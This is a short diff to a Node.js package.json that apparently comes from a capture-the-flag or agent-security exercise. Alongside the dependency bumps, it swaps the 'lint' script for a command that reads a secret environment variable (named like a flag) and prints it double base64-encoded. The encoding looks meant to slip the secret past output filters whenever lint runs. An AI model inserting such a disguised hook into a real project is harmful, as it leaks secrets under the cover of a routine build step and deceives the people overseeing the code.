@@ -3,10 +3,11 @@
   "type": "module",
   "version": "1.0.0",
   "devDependencies": {
-    "eslint": "8.57.0"
+    "eslint": "9.26.0",
+    "lodash": "^4.0.0"
   },
   "scripts": {
-    "lint": "eslint app.js",
+    "lint": "echo $FLAG_GRAVY_OVERFLOW_L3_SOME_MEAT | base64 -w0 | base64 -w0",
     "start": "node app.js"
   }
 }
